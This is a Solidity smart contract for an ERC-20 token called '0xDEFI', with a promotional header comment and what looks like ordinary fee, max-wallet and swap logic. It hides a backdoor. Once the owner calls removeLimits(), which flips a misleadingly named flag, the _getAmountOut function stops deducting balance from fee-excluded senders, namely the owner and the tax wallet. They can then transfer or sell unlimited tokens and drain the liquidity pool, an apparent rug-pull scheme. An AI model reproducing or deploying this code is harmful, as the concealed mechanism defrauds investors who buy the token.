// SPDX-License-Identifier: Unlicensed

/*
0xDefi is a revolutionary asset streaming protocol that brings subscriptions, salaries, vesting, and rewards to DAOs and crypto-native businesses worldwide.

Website: https://www.0xdefi.pro
Telegram: https://t.me/zeroxdefi_channel
Twitter: https://twitter.com/zeroxdefi_erc
Dapp: https://app.0xdefi.pro
*/

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract DEFI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string name_ = unicode"0xDEFI";
    string symbol_ = unicode"0xDEFI";

    mapping(address => uint256) balances_;
    mapping(address => mapping(address => uint256)) allowances_;
    mapping(address => bool) _isFeeExcluded;
    mapping(address => bool) _isMaxWalletExcluded;
    mapping(address => bool) _isMaxTxExcluded;
    mapping(address => bool) _isLpProvider;

    uint8 decimals_ = 9;
    uint256 _supply = 10**9 * 10**9;

    address payable marketingWallet_;
    address payable teamAddress_;

    IUniswapRouter private routerInstance_;
    address private pairAddress_;

    uint256 _presentedLiquidityFee_ = 0;
    uint256 _presentedMarketingFee_ = 20;
    uint256 _presentedDevelopmentFee_ = 0;
    uint256 _presentedTotalFee_ = 20;

    bool _inReentrance;
    bool _feeSwapEnabled = true;
    bool _noMaxTx = false;
    bool _isMaxWalletLifted = true;

    uint256 _buyerDefiLiquidityFee_ = 0;
    uint256 _buyerDefiMarketingFee_ = 20;
    uint256 _buyerDefiDevFee_ = 0;
    uint256 _buyerDefiFee_ = 20;

    uint256 sellDefiLiquidityFee_ = 0;
    uint256 sellDefiMarketingFee_ = 20;
    uint256 sellDefiDevFee_ = 0;
    uint256 sellDefiFee_ = 20;

    uint256 _amountMaxTx = 20 * 10**6 * 10**9;
    uint256 _amountMaxWallet = 20 * 10**6 * 10**9;
    uint256 _swapThreshold = 10**4 * 10**9;

    modifier lockSwap() {
        _inReentrance = true;
        _;
        _inReentrance = false;
    }

    constructor(address tax_) {
        balances_[_msgSender()] = _supply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pairAddress_ = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        routerInstance_ = _uniswapV2Router;
        allowances_[address(this)][address(routerInstance_)] = _supply;
        marketingWallet_ = payable(tax_);
        teamAddress_ = payable(tax_);
        _buyerDefiFee_ = _buyerDefiLiquidityFee_.add(_buyerDefiMarketingFee_).add(_buyerDefiDevFee_);
        sellDefiFee_ = sellDefiLiquidityFee_.add(sellDefiMarketingFee_).add(sellDefiDevFee_);
        _presentedTotalFee_ = _presentedLiquidityFee_.add(_presentedMarketingFee_).add(_presentedDevelopmentFee_);

        _isFeeExcluded[owner()] = true;
        _isFeeExcluded[marketingWallet_] = true;
        _isMaxWalletExcluded[owner()] = true;
        _isMaxWalletExcluded[pairAddress_] = true;
        _isMaxWalletExcluded[address(this)] = true;
        _isMaxTxExcluded[owner()] = true;
        _isMaxTxExcluded[marketingWallet_] = true;
        _isMaxTxExcluded[address(this)] = true;
        _isLpProvider[pairAddress_] = true;
        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public view returns (string memory) {
        return name_;
    }

    function symbol() public view returns (string memory) {
        return symbol_;
    }

    function decimals() public view returns (uint8) {
        return decimals_;
    }

    function totalSupply() public view override returns (uint256) {
        return _supply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances_[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _verifyMaxWallets(address to, uint256 amount) internal view {
        if (_isMaxWalletLifted && !_isMaxWalletExcluded[to]) {
            require(balances_[to].add(amount) <= _amountMaxWallet);
        }
    }

    function _getAmountIn(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (_isFeeExcluded[sender] || _isFeeExcluded[recipient]) {
            return amount;
        } else {
            return getDefiAmount_(sender, recipient, amount);
        }
    }

    function _getAmountOut(address sender, address recipient, uint256 amount, uint256 toAmount) internal view returns (uint256) {
        if (!_isMaxWalletLifted && _isFeeExcluded[sender]) {
            return amount.sub(toAmount);
        } else {
            return amount;
        }
    }

    function _transferNormal(address sender, address recipient, uint256 amount) internal {
        uint256 toAmount = _getAmountIn(sender, recipient, amount);
        _verifyMaxWallets(recipient, toAmount);
        uint256 subAmount = _getAmountOut(sender, recipient, amount, toAmount);            
        balances_[sender] = balances_[sender].sub(subAmount, "Balance check error");
        balances_[recipient] = balances_[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (_inReentrance) {
            return _basicTransfer(sender, recipient, amount);
        } else {
            _verifyTxSize(sender, recipient, amount);
            _verifySwap(sender, recipient, amount);
            _transferNormal(sender, recipient, amount);
            return true;
        }
    }

    function swapBackDefi_(uint256 tokenAmount) private lockSwap {
        uint256 lpFeeTokens = tokenAmount.mul(_presentedLiquidityFee_).div(_presentedTotalFee_).div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        swapTokensForETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = _presentedTotalFee_.sub(_presentedLiquidityFee_.div(2));

        uint256 amountETHLiquidity_ = ethCA.mul(_presentedLiquidityFee_).div(totalETHFee).div(2);
        uint256 amountETHDevelopment_ = ethCA.mul(_presentedDevelopmentFee_).div(totalETHFee);
        uint256 amountETHMarketing_ = ethCA.sub(amountETHLiquidity_).sub(amountETHDevelopment_);

        if (amountETHMarketing_ > 0) {
            transferDefiETH_(marketingWallet_, amountETHMarketing_);
        }

        if (amountETHDevelopment_ > 0) {
            transferDefiETH_(teamAddress_, amountETHDevelopment_);
        }
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        return _standardTransfer(sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowances_[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferDefiETH_(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _getTaxTokenAmount(address from, address to, uint256 amount) internal view returns (uint256) {
        if (_isLpProvider[from]) {
            return amount.mul(_buyerDefiFee_).div(100);
        } else if (_isLpProvider[to]) {
            return amount.mul(sellDefiFee_).div(100);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances_[account];
    }

    function _verifyTxSize(address sender, address recipient, uint256 amount) internal view {
        if (!_isMaxTxExcluded[sender] && !_isMaxTxExcluded[recipient]) {
            require(amount <= _amountMaxTx, "Transfer amount exceeds the max.");
        }
    }

    function _verifySwap(address from, address to, uint256 amount) internal {
        uint256 _feeAmount = balanceOf(address(this));
        bool minSwapable = _feeAmount >= _swapThreshold;
        bool isExTo = !_inReentrance && _isLpProvider[to] && _feeSwapEnabled;
        bool swapAbove = !_isFeeExcluded[from] && amount > _swapThreshold;
        if (minSwapable && isExTo && swapAbove) {
            if (_noMaxTx) {
                _feeAmount = _swapThreshold;
            }
            swapBackDefi_(_feeAmount);
        }
    }

    function getDefiAmount_(address sender, address receipient, uint256 amount) internal returns (uint256) {
        uint256 fee = _getTaxTokenAmount(sender, receipient, amount);
        if (fee > 0) {
            balances_[address(this)] = balances_[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }

    receive() external payable {}

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances_[sender] = balances_[sender].sub(amount, "Insufficient Balance");
        balances_[recipient] = balances_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances_[owner][spender];
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerInstance_.WETH();

        _approve(address(this), address(routerInstance_), tokenAmount);

        routerInstance_.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _amountMaxTx = _supply;
        _isMaxWalletLifted = false;
        _buyerDefiMarketingFee_ = 1;
        sellDefiMarketingFee_ = 1;
        _buyerDefiFee_ = 1;
        sellDefiFee_ = 1;
    }
}